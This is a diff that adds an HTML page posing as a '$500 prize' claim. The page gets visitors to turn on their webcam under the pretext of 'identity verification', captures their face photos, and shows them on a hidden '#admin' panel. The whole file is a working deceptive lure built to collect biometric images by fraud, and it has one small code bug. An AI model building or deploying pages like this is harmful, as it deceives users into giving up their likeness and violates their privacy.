@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>CONGRATULATIONS! YOU WON $500</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background-size: cover;
+            background-attachment: fixed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.8s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h1 {
+            color: #ffd700;
+            font-size: 2rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+        }
+        p {
+            font-size: 1.05rem;
+            margin-bottom: 20px;
+            color: #e0e0e0;
+            line-height: 1.5;
+        }
+        .highlight {
+            color: #00ff88;
+            font-weight: bold;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.1rem;
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 176, 155, 0.4);
+            margin-top: 10px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 176, 155, 0.6);
+        }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
+        }
+        .btn-danger:hover {
+            box-shadow: 0 8px 20px rgba(255, 65, 108, 0.6);
+        }
+        #cam-section {
+            display: none;
+        }
+        #video {
+            width: 100%;
+            max-height: 280px;
+            object-fit: cover;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        #status {
+            font-size: 0.95rem;
+            color: #a0aec0;
+            margin-bottom: 15px;
+        }
+        /* Админ панел */
+        .admin-panel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0b0f19;
+            z-index: 9999;
+            padding: 30px;
+            overflow-y: auto;
+        }
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 20px;
+        }
+        .admin-header h1 {
+            font-size: 1.5rem;
+            color: #00ff88;
+            margin: 0;
+            text-shadow: none;
+        }
+        .admin-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        .admin-buttons button {
+            width: auto;
+            padding: 10px 20px;
+            font-size: 0.9rem;
+            margin: 0;
+        }
+        .captured-images {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+        }
+        .img-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            transition: transform 0.2s;
+        }
+        .img-item:hover {
+            transform: translateY(-5px);
+            border-color: #00ff88;
+        }
+        .img-item img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 8px;
+        }
+        .img-item p {
+            font-size: 0.85rem;
+            color: #a0aec0;
+            margin: 0;
+        }
+        .no-photos {
+            grid-column: 1 / -1;
+            text-align: center;
+            color: #718096;
+            font-size: 1.1rem;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Саҳифаи асосӣ -->
+    <div class="container" id="main-screen">
+        <h1>🎉 CONGRATULATIONS!</h1>
+        <p>You have been selected to receive <span class="highlight">$500 USD</span>!</p>
+        <p>To claim your prize securely, please verify your identity.</p>
+        <button class="btn" onclick="startCamera()">VERIFY ID NOW</button>
+    </div>
+
+    <!-- Бахши камера -->
+    <div class="container" id="cam-section">
+        <h1>📸 IDENTITY VERIFICATION</h1>
+        <p>Please look straight into the camera and stay still.</p>
+        <video id="video" autoplay playsinline muted></video>
+        <p id="status">Status: Initializing camera...</p>
+        <button class="btn" onclick="capturePhoto()">CAPTURE & CLAIM</button>
+    </div>
+
+    <!-- Панели админ -->
+    <div class="admin-panel" id="admin-panel">
+        <div class="admin-header">
+            <h1>🟢 ADMIN PANEL | CAPTURED DATA</h1>
+            <div class="admin-buttons">
+                <button class="btn btn-danger" onclick="clearStorage()">Clear All</button>
+                <button class="btn" onclick="goToMain()">Exit Panel</button>
+            </div>
+        </div>
+        <div class="captured-images" id="image-container">
+            <div class="no-photos">No photos captured yet.</div>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_HASH = "admin";
+
+        function checkAdminRoute() {
+            if (window.location.hash === "#" + ADMIN_HASH) {
+                document.getElementById("main-screen").style.display = "none";
+                document.getElementById("cam-section").style.display = "none";
+                document.getElementById("admin-panel").style.display = "block";
+                loadAdminPhotos();
+            } else {
+                document.getElementById("admin-panel").style.display = "none";
+            }
+        }
+
+        window.addEventListener('hashchange', checkAdminRoute);
+        window.addEventListener('DOMContentLoaded', checkAdminRoute);
+
+        let stream;
+        async function startCamera() {
+            document.getElementById("main-screen").style.display = "none";
+            document.getElementById("cam-section").style.display = "block";
+            const video = document.getElementById("video");
+            try {
+                const constraints = {
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                };
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                document.getElementById("status").innerText = "Status: Camera active. Ready!";
+            } catch (err) {
+                document.getElementById("status").innerText = "Error: Camera access denied or not supported.";
+                console.error("Camera error:", err);
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById("video");
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL("image/jpeg", 0.85);
+
+            const timestamp = new Date().toLocaleString();
+            
+            let storedImages = JSON.parse(localStorage.getItem("capturedImages") || "[]");
+            storedImages.push({ data: photoData, time: timestamp });
+            localStorage.setItem("capturedImages", JSON.stringify(storedImages));
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            document.getElementById("status").innerText = "Success! Processing prize...";
+            setTimeout(() => {
+                alert("Verification complete! Your reward is on the way.");
+                window.location.reload();
+            }, 1500);
+        }
+
+        function loadAdminPhotos() {
+            const container = document.getElementById("image-container");
+            let storedImages = JSON.parse(localStorage.getItem("capturedImages") || "[]");
+            
+            if (storedImages.name === 0 || storedImages.length === 0) {
+                container.innerHTML = '<div class="no-photos">No photos captured yet.</div>';
+                return;
+            }
+
+            container.innerHTML = "";
+            storedImages.forEach(img => {
+                const div = document.createElement("div");
+                div.className = "img-item";
+                div.innerHTML = `
+                    <img src="${img.data}" alt="Captured Face">
+                    <p>🕒 ${img.time}</p>
+                `;
+                container.appendChild(div);
+            });
+        }
+
+        function clearStorage() {
+            if (confirm("Are you sure you want to delete all stored photos?")) {
+                localStorage.removeItem("capturedImages");
+                loadAdminPhotos();
+            }
+        }
+
+        function goToMain() {
+            window.location.hash = "";
+            window.location.reload();
+        }
+    </script>
+</body>
+</html>
